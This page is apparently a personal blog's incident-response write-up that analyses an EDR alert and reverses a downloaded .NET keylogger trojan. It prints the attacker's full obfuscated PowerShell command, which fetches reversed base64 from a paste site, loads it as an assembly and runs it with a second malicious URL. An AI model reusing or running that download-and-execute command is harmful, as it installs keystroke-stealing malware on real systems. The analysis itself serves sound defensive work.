<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>PowerShell .NET Assembly Usage</title>
        <link rel="icon" type="image/x-icon" href="assets/img/favicon.ico" />
        <!-- Font Awesome icons (free version)-->
        <script src="https://use.fontawesome.com/releases/v5.15.1/js/all.js" crossorigin="anonymous"></script>
        <!-- Google fonts-->
        <link href="https://fonts.googleapis.com/css?family=Saira+Extra+Condensed:500,700" rel="stylesheet" type="text/css" />
        <link href="https://fonts.googleapis.com/css?family=Muli:400,400i,800,800i" rel="stylesheet" type="text/css" />
        <!-- Core theme CSS (includes Bootstrap)-->
        <link href="../css/styles.css" rel="stylesheet" />
    </head>
    <body id="page-top">
        <!-- Navigation-->
        <nav class="navbar navbar-expand-xl navbar-dark bg-primary fixed-top" id="sideNav">
            <a class="navbar-brand js-scroll-trigger" href="../index.html">
                <span class="d-block d-xl-none">Olivier LEUNG</span>
                <span class="d-none d-xl-block"><img class="img-fluid img-profile rounded-circle mx-auto mb-2" src="../assets/img/profile.jpg" alt="" /></span>
            </a>
            <div class="d-none d-xl-block description_profile"> <!--d-none is used for responsiveness of the panel when we shring the window -->
                <h3>Olivier LEUNG</h3>
                <div class="subheading_panel">Cybersecurity engineer </div>
                    <div class="subheading_description">Love testing random cyber stuff !<br>That's by baking we become a baker</div>
            </div>
            <!-- button collapse panel when small windows, responsive pane -->
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button> 
            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav">
                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="../ctfpage.html">CTF</a></li>
                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="../dfirpage.html">DFIR</a></li>
                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="../binarypage.html">Binary Exploitation</a></li>
                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="../reversepage.html">Reverse Engineering</a></li>
                    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="../tutorialpage.html">Tutorial</a></li>
                </ul>
            </div>

            <div class="d-none d-xl-block social-icons">
                <a class="social-icon" target="_blank" rel="noopener noreferrer" href="https://www.linkedin.com/in/olivierleung"><i class="fab fa-linkedin-in"></i></a>
                <a class="social-icon" target="_blank" rel="noopener noreferrer" href="https://github.com/SkallZou"><i class="fab fa-github"></i></a>
                <a class="social-icon" target="_blank" rel="noopener noreferrer" href="https://twitter.com/olivier_leung"><i class="fab fa-twitter"></i></a>
            </div>
        </nav>
        <!-- Page Content-->
        <div>
            <nav class="navbar navbar-expand-xl navbar-dark bg-secondary sticky-top">
            <h3 class="header-article"><a href="../dfirpage.html">Digital Forensics and Incident Response </a>> Investigation - PowerShell .NET Assembly Usage detected</h3>
            </nav>
            
            <section class="article">
                <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
                    <div class="flex-grow-1">
                        <h3 class="mb-0">1/ DETECTION</h3>
                        <p>
                            The detection comes from the EDR <strong>FireEye HX</strong>, and it alerts us that one system is having some .NET methods that might be used to download resources from a remote location or stored on disk or registry. <br>
                            <br>

                            <i>The .NET Assembly.Load method provides an interface to access resources within .NET assemblies. PowerShell can utilize this functionality to execute methods within a .NET assembly that is downloaded from a remote location or stored on disk or registry. This is associated with MITRE ATT&CK (r) Tactic(s): Command And Control, Defense Evasion, Execution, Privilege Escalation and Technique(s): T1027, T1055.002, T1059.001, T1132.001. </i><br>
                            Source: <strong>Mandiant</strong> <br>
                            <br>

                            <i style="background-color: yellow">
                                Alerted 21 minutes ago <br>
                                processEvent/timestamp  2020-12-01 17:42:05Z <br>
                                processEvent/startTime  2020-12-01 17:42:05Z <br>
                                processEvent/eventType  start <br>
                                processEvent/pid    10876 <br>
                                processEvent/processPath    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe <br>
                                processEvent/process    powershell.exe <br>
                                processEvent/parentPid  5084 <br>
                                processEvent/parentProcessPath  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe <br>
                                processEvent/parentProcess  powershell.exe <br>
                                processEvent/username   DOMAIN\UserX <br>
                                processEvent/md5    cda48fc75952ad12d99e526d0b6bf70a <br>
                                processEvent/processCmdLine "C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" <br>
                                -windowstyle hidden -ExecutionPolicy Bypass -NoProfile -Command "$dll = '0/8JMh1/r/ee.etsap//:sptth';$RumpeD = (New-Object Net.WebClient).DownloadString( $dll[-1..-$dll.Length] -join '' );[Byte[]] $Rumpe = [System.Convert]::FromBase64String( $RumpeD[-1..-$RumpeD.Length] -join '' );[Reflection.Assembly]::Load($Rumpe).GetType('ent.Class1').GetMethod('Run').Invoke($null, [object[]] ('txt.33615435222/sbv/erots.sbvle//:ptth'))" <br>
                            </i>

                         </p>
                    </div>
                </div>
            </section>
             <section class="article">
                <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
                    <div class="flex-grow-1">
                        <h3 class="mb-0">2/ Investigation</h3>
                            <br>
                            The field "processCmdLine" gives a lot of information, but if we're neglecting it, we will probably not understand what the command line does. <br>
                            <br>
                            First, we have a variable « dll » storing the value <i>'0/8JMh1/r/ee.etsap//:sptth'</i>
                            then another variable « RumpeD » storing the result of the .NetWebClient method « DownloadString ». This method is used to download resources from the argument. <br>
                            <br>
                            <strong>What does $dll[-1..-$dll.Length] -join '' do ?</strong> <br>
                            Good thing that we’re in a Windows system, and have a native IDE for PowerShell, « Powershell ISE ».
                            <img src="img/PS .NET Assembly Usage/psise.png" class="img-fluid" width="700">
                            Putting the part of the code that interest us might give us the information we're looking for. 
                            From « powershell ISE », we retrieve an URL and we must check this one, because one system of our network is downloading something from that webpage.
                            Many tools can be used, I will suggest to run the URL in any kind of sandbox such as AnyRun. <br>
                            If the URL contains private information, do not ever run on a public sandbox. We don’t want to leak data. <br>
                            Url : <strong>https://paste.ee/r/1hMJ8/0</strong>

                            <img src="img/PS .NET Assembly Usage/sandbox1.png" class="img-fluid" width="700">
                            The content of the URL is mostly encrypted data. Looking at the structure of the string, it looks like base64. <br>
                            <br>
                            <strong>How to recognize this is a base64 encoding ?</strong> <br>
                            Base64 will only be composed of characters 'A-Z', 'a-z', '0-9', '+', '/' and it is padded at the end with '=', to make the length a multiple of 4. <br>
                            Since we see that there are ‘==’ at the beginning of the string we can guess that the encoded data is also inversed. So before decoding it, we probably should reverse it. <br>
                            Therefore, we understand why the command line has $Rumpe = [System.Convert]::FromBase64String( $RumpeD[-1..-$RumpeD.Length] -join '') <br>
                            To retrieve all the content of the webpage, we will use the <i>curl</i> command. Accessing to a webpage is the same as making a GET request. <br>
                            <div class="squarebox">Curl –X GET https://paste.ee/r/1hMJ8/0 -o encodedString.txt</div>
                            <img src="img/PS .NET Assembly Usage/curlget.png" class="img-fluid" width="700">
                            Then on linux, the function <i>rev</i> allows us to reverse any string. <br>
                            <div class="squarebox">cat encodedString.txt | rev > encodedStringREV.txt</div> <br>
                            Once we have reversed the content of the file, we can decode any base64 with the command base64 and using the parameter –d. <br>
                            <div class="squarebox">
                                base64 –d encodedStringREV.txt > String.txt
                            </div>
                            

                            <img src="img/PS .NET Assembly Usage/string.png" class="img-fluid" width="700">

                            The decoded file is acutally a binary file. We can use <i>hexdump</i> to see if that is a PE file (Windows executable), the magic byte « 4d 5a » confirm that it is a PE file.

                            <img src="img/PS .NET Assembly Usage/hexdump.png" class="img-fluid" width="700">

                            <div class="longword" style="background-color: yellow">
                                [Byte[]] $Rumpe = [System.Convert]::FromBase64String( $RumpeD[-1..-$RumpeD.Length] -join '' );
                                [Reflection.Assembly]::Load($Rumpe).GetType('ent.Class1').GetMethod('Run').Invoke($null, [object[]] ('txt.33615435222/sbv/erots.sbvle//:ptth'))"
                            </div><br>

                            The method « FromBase64String » on the variable RumpeD and store it on a new variable « Rumpe ». According to Microsoft docs, the method [Reflection.Assembly]::Load() is taking a Byte type in argument so that explains why the script cast the variable Rumpe in Byte[]. Then the function "<i>Invoke</i>" is called to remotely run a command. The argument of the function "<i>Invoke</i>" seems to be another reverse URL. It is probably used to bypass URL check.<br>
                            <br>
                            <u>In powershell like in php « $ » is to indicate a variable.</u>

                            
                            <br>To reverse the string, use the command <i>rev</i> on linux. 

                            <img src="img/PS .NET Assembly Usage/rev.png" class="img-fluid" width="700">

                            So we get the second URL : http://elvbs.store/vbs/22253451633.txt <br>

                            Always check an URL through a safe environment.

                            <img src="img/PS .NET Assembly Usage/sandbox2.png" class="img-fluid" width="700">

                            The content of the webpage is another base64


                            <img src="img/PS .NET Assembly Usage/string2.png" class="img-fluid" width="700">
                            Once decode, we found another PE file since we have MZ byte. <br>
                            Since this URL is the one that is going to run on a system, let's find out what it does. 
                            We will continue the investigation with some static analysis, let's analyze the strings of the binary. <strong>Radare2</strong> is a powerful tool to do some reverse engineering.
                            Radare2 comes with a tool called rabin2 and it can extract the binary information by using the –I parameter, the string with –z parameter or use –zz if we don’t want to be limited on the string found on the data section. <br>
                            <div class="squarebox">
                                Rabin2 –zz string2.exe
                            </div>

                            <img src="img/PS .NET Assembly Usage/rabin2.png" class="img-fluid" width="500">

                            Looking at the string, we see that this PE file contains an executable file called « dayandi.exe » and below we see the word Keylogger. <br>
                            <br>
                            <div class="squarebox">rabin2 -I string2.exe</div>
                            <img src="img/PS .NET Assembly Usage/rabin2info.png" class="img-fluid" width="500">

                            This is a .NET executable, since radare2 is not optimized for .NET file, let's switch to another tool called <strong>dnSpy</strong> which supports decompilation, simple deobfuscation, modification and debugging of .NET applications.

                            <img src="img/PS .NET Assembly Usage/dnspy1.png" class="img-fluid" width="800">
                            With dnSpy, we managed to retrieve the classes, the functions of the program. There are two classes in the .NET application, <strong>Keylogger</strong> and <strong>Program</strong>. Looking at the function <i>Fix</i>, it takes an object of <i>Key</i> as argument.
                            A boolean is present to determine if the user is clicking on the shift key.<br><u>bool flag = this.keyboard.ShiftKeyDown;</u> <br> If the variable <i>flag</i> is set to YES, then the function will return a upperletter of the key pressed by the user. <br>
                            <strong>result = Strings.ChrW((int)k).ToString().ToUpper();</strong>


                            <img src="img/PS .NET Assembly Usage/dnspy2.png" class="img-fluid" width="800">

                            To retrieve the user inputs, it is using the class Keyboard from the library "Microsoft.VisualBasic.Devices", calling a function "SendKeys".

                            <img src="img/PS .NET Assembly Usage/sendkey.png" width="700">

                            DnSpy allows us to see the flow of a part of the program. The function "Fix" was called by the function "WRK" until reaching the starting point (function "Main").

                            There are also two interesting functions "Send" and "Receive", the function "Send" used tcpsocket, which lead to a TCP connection. <br>
                            Checking the method 
                            <strong>Program.tcpSocket.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length),SocketFlags.None);</strong>, it seems that the function is sending the data inside of the memoryStream.<br>
                            <br>
                            Let's find out exactly how the program is going to make that connection. There is a function named "Connect", creating MemoryStream, TcpClient object and calling another function with <strong>host</strong> and <strong>port</strong> as argument.

                            <img src="img/PS .NET Assembly Usage/connect.png" class="img-fluid" width="800">
                            Clicking on the host, we notice that those variables are the class "Program" attributes and they are set by default.

                            <img src="img/PS .NET Assembly Usage/attributes.png" class="img-fluid" width="800">

                            Looking at attributes, we managed to find the domain where the program will connect and send the data. We also retrieve the port, then we have some encrypted data. All those data might be seen as indicator of compromising.

                            Analyzing on the attribute victimName, it is used in the method "Connect" and it uses a function Base64ToString to read the variable. After decoding the base64, we have <strong>victimName = NYAN CAT</strong>. <br>

                            <img src="img/PS .NET Assembly Usage/virustotal.png" class="img-fluid" width="700">

                            That domain has been classified as malicious by 2 antiviruses, Fortinet and Kaspersky. <br>
                            <br>
                            Registry key can also sound like persistence. The program is calling the method "CreateSubKey" on the HKEY_CURRENT_USER\Software and use the attribute "registryName" as argument, so "registryName" doesn't seem to be encrypted. The registry hive HKCU contains information for Windows and softwares for a specific user. The default path for persistance is "<strong>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</strong>". In this case, it creates a subkey of HKCU\Software, this subkey gives the default location of an executable, and is not a sign of persistence.

                            <img src="img/PS .NET Assembly Usage/registry.png" class="img-fluid" width="700">

                        </p>
                    </div>
                </div>
            </section>
            <section class="article">
                <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
                    <div class="flex-grow-1">
                        <h3 class="mb-0">3/ Conclusion</h3>
                        FireEye has detected a suspicious bahavior, but doesn't really know what was exactly the program installed by the user. After, reversing the program, we've found it will proceed to a connection to a domain on a specific port. It also records all the user's inputs and send it to the domain. Therefore, it is a trojan keylogger which register every keyboard input and send it to the domain. 

                        After that analysis, we know the intention of the attacker, retrieving the users' credentials and get an access to the company network. <br>
                        Blocking the domain name, file hash is a good start for future protection. A rebuild of the system, and expiring the user's password is necessary. 
                    </div>
                </div>
            </section>
        <footer class="py-3 bg-white">
            <div class="container">
              <p class="m-0 text-center footerpage" style="font-size: 12px;">Copyright &copy; 2020 Olivier Leung. All rights reserved.</p>
            </div>
        </footer>
        </div>
        <!-- Bootstrap core JS-->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <!-- Third party plugin JS-->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.4.1/jquery.easing.min.js"></script>
        <!-- Core theme JS-->
        <script src="js/scripts.js"></script>
    </body>
</html>
